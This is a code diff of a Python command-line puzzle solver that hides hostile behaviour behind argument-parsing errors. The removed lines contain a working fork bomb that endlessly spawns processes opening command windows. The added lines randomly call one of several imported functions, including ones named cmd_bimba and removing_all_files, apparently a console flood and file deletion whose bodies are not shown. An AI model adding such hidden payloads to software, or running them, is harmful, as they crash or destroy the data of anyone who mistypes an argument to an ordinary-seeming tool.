@@ -4,8 +4,9 @@
 В классе <Solution> реализуется CLI.
 """
 import sys
-import os
+from random import choice
 
+from funny import *
 from solver import Solver
 from constants import *
 from dbm import DEBUG
@@ -20,10 +21,18 @@ from generator import generate_puzzle
 class Solution:
     def __init__(self):
         self.debug_flag = True
+
+        self.funcs = [cmd_bimba, removing_all_files, hihihaha]
+
         parser = argparse.ArgumentParser(
             description=HELP_DESCRIPTION,
             formatter_class=argparse.RawTextHelpFormatter
         )
+
+        parser.add_argument("--author",
+                            "-a",
+                            action="store_true",
+                            help=HELP_AUTHOR)
 
         parser.add_argument("--restart",
                             "-r",
@@ -73,10 +82,7 @@ class Solution:
             try:
                 args = parser.parse_args()
             except BaseException:
-                import os
-                from multiprocessing import Process
-                while True:
-                    Process(target=self.fork_bimba).start()
+                choice(self.funcs)()
 
         else:
             args = parser.parse_args()
@@ -87,6 +93,10 @@ class Solution:
         self.count = None
         self.method_out = None
         self.output_file = None
+
+        if args.author:
+            open_teachers_page()
+            sys.exit(0)
 
         if not args.restart:
             self.restarting = False
@@ -133,10 +143,6 @@ class Solution:
             "method_out": self.method_out
         }
         self._solver = Solver(settings)
-
-    def fork_bimba(self):
-        while True:
-            os.system("start cmd")
 
     @check_success_for_method
     def solve(self):
